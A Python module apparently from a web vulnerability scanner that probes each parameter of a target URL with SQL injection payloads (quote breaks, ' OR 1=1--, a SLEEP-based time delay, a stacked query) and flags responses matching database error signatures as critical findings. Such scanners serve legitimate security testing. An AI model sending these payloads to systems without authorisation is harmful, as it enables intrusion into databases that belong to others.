from awap.engines.attack.base import AttackModule


class SQLiErrorModule(AttackModule):
    module_id = "sqli_error"
    vuln_class = "SQL_INJECTION"

    SQL_ERROR_SIGNATURES = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "pg::syntaxerror",
        "ora-01756",
        "microsoft ole db provider for sql server",
        "sqlite_error",
        "syntax error or access violation",
    ]
    SQL_PAYLOADS = [
        "'", "''", "' OR '1'='1", "' OR 1=1--", '" OR "1"="1',
        "1' AND SLEEP(5)--", "1; SELECT 1--",
    ]

    async def run(self, target_url: str, params: list[dict], context=None) -> list[dict]:
        findings = []
        for param in params:
            for payload in self.SQL_PAYLOADS:
                resp, meta = await self.send_payload(
                    target_url, "GET", payload, param["name"], param["type"], context
                )
                if not resp:
                    continue
                body_lower = resp.text.lower()
                for sig in self.SQL_ERROR_SIGNATURES:
                    if sig in body_lower:
                        rae = self.analyze_with_rae(context, target_url, resp, payload)
                        findings.append({
                            "vuln_class": "SQL_INJECTION",
                            "url": target_url,
                            "method": "GET",
                            "param": param["name"],
                            "parameter_type": param["type"].upper(),
                            "payload": payload,
                            "evidence": sig,
                            "severity": "CRITICAL",
                            "cvss": 9.8,
                            "confidence": max(0.85, rae.get("confidence", 0)),
                            "confirmed": True,
                            "request_raw": meta.get("request_raw"),
                            "response_raw": meta.get("response_raw"),
                        })
                        break
        return findings
